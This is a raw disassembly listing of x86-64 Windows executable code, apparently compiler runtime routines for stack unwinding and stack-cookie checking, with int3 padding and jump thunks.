   14000171c:	e8 ff fe ff ff       	call   0x140001620
   140001721:	90                   	nop
   140001722:	48 83 c4 38          	add    $0x38,%rsp
   140001726:	c3                   	ret
   140001727:	cc                   	int3
   140001728:	40 53                	rex push %rbx
   14000172a:	56                   	push   %rsi
   14000172b:	57                   	push   %rdi
   14000172c:	48 83 ec 40          	sub    $0x40,%rsp
   140001730:	48 8b d9             	mov    %rcx,%rbx
   140001733:	ff 15 47 09 00 00    	call   *0x947(%rip)        # 0x140002080
   140001739:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   140001740:	33 ff                	xor    %edi,%edi
   140001742:	45 33 c0             	xor    %r8d,%r8d
   140001745:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000174a:	48 8b ce             	mov    %rsi,%rcx
   14000174d:	ff 15 35 09 00 00    	call   *0x935(%rip)        # 0x140002088
   140001753:	48 85 c0             	test   %rax,%rax
   140001756:	74 3c                	je     0x140001794
   140001758:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   14000175d:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140001762:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140001769:	00 00 
   14000176b:	4c 8b c8             	mov    %rax,%r9
   14000176e:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140001773:	4c 8b c6             	mov    %rsi,%r8
   140001776:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000177b:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140001780:	33 c9                	xor    %ecx,%ecx
   140001782:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001787:	ff 15 03 09 00 00    	call   *0x903(%rip)        # 0x140002090
   14000178d:	ff c7                	inc    %edi
   14000178f:	83 ff 02             	cmp    $0x2,%edi
   140001792:	7c ae                	jl     0x140001742
   140001794:	48 83 c4 40          	add    $0x40,%rsp
   140001798:	5f                   	pop    %rdi
   140001799:	5e                   	pop    %rsi
   14000179a:	5b                   	pop    %rbx
   14000179b:	c3                   	ret
   14000179c:	48 83 ec 28          	sub    $0x28,%rsp
   1400017a0:	4d 8b 41 38          	mov    0x38(%r9),%r8
   1400017a4:	48 8b ca             	mov    %rdx,%rcx
   1400017a7:	49 8b d1             	mov    %r9,%rdx
   1400017aa:	e8 0d 00 00 00       	call   0x1400017bc
   1400017af:	b8 01 00 00 00       	mov    $0x1,%eax
   1400017b4:	48 83 c4 28          	add    $0x28,%rsp
   1400017b8:	c3                   	ret
   1400017b9:	cc                   	int3
   1400017ba:	cc                   	int3
   1400017bb:	cc                   	int3
   1400017bc:	40 53                	rex push %rbx
   1400017be:	45 8b 18             	mov    (%r8),%r11d
   1400017c1:	48 8b da             	mov    %rdx,%rbx
   1400017c4:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   1400017c8:	4c 8b c9             	mov    %rcx,%r9
   1400017cb:	41 f6 00 04          	testb  $0x4,(%r8)
   1400017cf:	4c 8b d1             	mov    %rcx,%r10
   1400017d2:	74 13                	je     0x1400017e7
   1400017d4:	41 8b 40 08          	mov    0x8(%r8),%eax
   1400017d8:	4d 63 50 04          	movslq 0x4(%r8),%r10
   1400017dc:	f7 d8                	neg    %eax
   1400017de:	4c 03 d1             	add    %rcx,%r10
   1400017e1:	48 63 c8             	movslq %eax,%rcx
   1400017e4:	4c 23 d1             	and    %rcx,%r10
   1400017e7:	49 63 c3             	movslq %r11d,%rax
   1400017ea:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   1400017ee:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1400017f2:	8b 48 08             	mov    0x8(%rax),%ecx
   1400017f5:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1400017f9:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   1400017fe:	74 10                	je     0x140001810
   140001800:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   140001805:	b9 f0 ff ff ff       	mov    $0xfffffff0,%ecx
   14000180a:	48 23 c1             	and    %rcx,%rax
   14000180d:	4c 03 c8             	add    %rax,%r9
   140001810:	4c 33 ca             	xor    %rdx,%r9
   140001813:	49 8b c9             	mov    %r9,%rcx
   140001816:	5b                   	pop    %rbx
   140001817:	e9 e4 fd ff ff       	jmp    0x140001600
   14000181c:	c2 00 00             	ret    $0x0
   14000181f:	cc                   	int3
   140001820:	cc                   	int3
   140001821:	cc                   	int3
   140001822:	cc                   	int3
   140001823:	cc                   	int3
   140001824:	cc                   	int3
   140001825:	cc                   	int3
   140001826:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000182d:	00 00 00 
   140001830:	ff e0                	jmp    *%rax
   140001832:	cc                   	int3
   140001833:	cc                   	int3
   140001834:	cc                   	int3
   140001835:	cc                   	int3
   140001836:	cc                   	int3
   140001837:	cc                   	int3
   140001838:	cc                   	int3
   140001839:	cc                   	int3
   14000183a:	cc                   	int3
   14000183b:	cc                   	int3
   14000183c:	cc                   	int3
   14000183d:	cc                   	int3
   14000183e:	cc                   	int3
   14000183f:	cc                   	int3
   140001840:	cc                   	int3
   140001841:	cc                   	int3
   140001842:	cc                   	int3
   140001843:	cc                   	int3
   140001844:	cc                   	int3
   140001845:	cc                   	int3
   140001846:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000184d:	00 00 00 
   140001850:	ff 25 6a 08 00 00    	jmp    *0x86a(%rip)        # 0x1400020c0
